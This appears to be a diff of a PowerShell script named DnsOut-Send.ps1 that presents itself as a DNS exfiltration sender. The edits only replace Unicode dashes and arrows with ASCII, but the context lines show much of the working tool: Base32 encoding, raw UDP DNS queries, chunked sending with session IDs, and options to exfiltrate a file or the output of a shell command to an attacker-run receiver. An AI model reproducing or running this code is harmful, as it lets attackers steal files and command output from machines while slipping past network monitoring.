@@ -1,9 +1,9 @@
 <#
 .SYNOPSIS
-    DnsOut-Send.ps1 — DNS exfiltration sender for Windows (PowerShell rewrite)
+    DnsOut-Send.ps1 - DNS exfiltration sender for Windows (PowerShell rewrite)
 
 .DESCRIPTION
-    Exfiltrates data via DNS A-record queries. Pure PowerShell — no Python needed.
+    Exfiltrates data via DNS A-record queries. Pure PowerShell - no Python needed.
     Receiver: python3 dnsout.py recv --port 5353 (or the Python receiver on your server)
 
 .PARAMETER Server
@@ -19,7 +19,7 @@
     File to exfiltrate.
 
 .PARAMETER Command
-    Shell command — exfiltrate its output.
+    Shell command - exfiltrate its output.
 
 .PARAMETER Delay
     Milliseconds between queries (default: 200).
@@ -42,7 +42,7 @@ param(
     [int]   $ChunkSize = 28
 )
 
-# ── Encoding helpers ───────────────────────────────────────────────────────────
+# -- Encoding helpers -----------------------------------------------------------
 function ConvertTo-Base32 {
     param([byte[]]$Bytes)
     $alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
@@ -63,7 +63,7 @@ function ConvertTo-Base32 {
     return $result.ToString().ToLower()
 }
 
-# ── DNS query (raw UDP) ────────────────────────────────────────────────────────
+# -- DNS query (raw UDP) --------------------------------------------------------
 function Send-DnsQuery {
     param([string]$QName, [string]$DnsServer, [int]$DnsPort)
     try {
@@ -92,13 +92,13 @@ function Send-DnsQuery {
     } catch { }
 }
 
-# ── Session ID ─────────────────────────────────────────────────────────────────
+# -- Session ID -----------------------------------------------------------------
 function New-SessionId {
     $bytes = [byte[]](1..4 | ForEach-Object { Get-Random -Max 256 })
     return ConvertTo-Base32 $bytes
 }
 
-# ── Main send logic ────────────────────────────────────────────────────────────
+# -- Main send logic ------------------------------------------------------------
 function Send-Data {
     param([byte[]]$Data)
 
@@ -112,7 +112,7 @@ function Send-Data {
     $total = $chunks.Count
 
     Write-Host "[*] Session   : $sid"
-    Write-Host "[*] Payload   : $($Data.Length) bytes → $($encoded.Length) chars → $total queries"
+    Write-Host "[*] Payload   : $($Data.Length) bytes -> $($encoded.Length) chars -> $total queries"
     Write-Host "[*] DNS server: ${Server}:$Port"
     Write-Host "[*] Domain    : $Domain`n"
 
@@ -130,10 +130,10 @@ function Send-Data {
     Write-Host ""
     # Signal end
     Send-DnsQuery "$sid.end.$total.$Domain" $Server $Port
-    Write-Host "[+] Done — $total queries sent for session $sid"
+    Write-Host "[+] Done - $total queries sent for session $sid"
 }
 
-# ── Entry point ────────────────────────────────────────────────────────────────
+# -- Entry point ----------------------------------------------------------------
 if ($File) {
     Write-Host "[*] Exfiltrating file: $File"
     $data = [IO.File]::ReadAllBytes($File)
